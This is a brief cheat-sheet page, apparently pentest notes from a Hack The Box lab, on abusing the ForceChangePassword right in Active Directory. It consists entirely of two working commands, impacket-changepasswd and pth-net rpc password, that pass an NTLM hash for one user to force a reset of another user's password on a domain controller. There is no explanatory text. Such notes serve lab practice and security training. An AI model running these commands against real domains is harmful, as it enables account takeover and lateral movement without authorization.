# ForceChangePassword

{% code overflow="wrap" fullWidth="true" %}
```
impacket-changepasswd 'scepter.htb'/'a.carter'@10.10.11.65 -reset -altuser 'd.baker' -althash :'18b5fb0d99e7a475316213c15b6f22ce'
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```
pth-net rpc password "a.carter" "newP@ssword2022" -U "scepter.htb"/"d.baker"%"aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce" -S "10.10.11.65" 
```
{% endcode %}
